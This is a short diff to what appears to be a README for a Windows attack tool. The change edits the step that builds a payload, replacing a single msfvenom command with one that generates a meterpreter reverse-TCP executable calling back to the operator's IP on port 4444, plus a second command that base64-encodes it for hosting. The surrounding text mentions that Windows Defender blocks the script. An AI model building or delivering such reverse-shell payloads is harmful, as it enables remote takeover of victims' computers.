@@ -11,7 +11,8 @@ Please note that Windows Defender will stop this script from running. Windows De
 This command will create a Windows executable file, encoded in base64. Make sure to replace `0.0.0.0` with your IP.
 
 ```bash
-msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=0.0.0.0 LPORT=4444 -f exe -e php/base64 -o winner.exe.b64
+msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=0.0.0.0 LPORT=4444 -f exe -o winner.exe
+base64 winner.exe > winner.exe.b64
 ```
 
 ## Hosting Payload
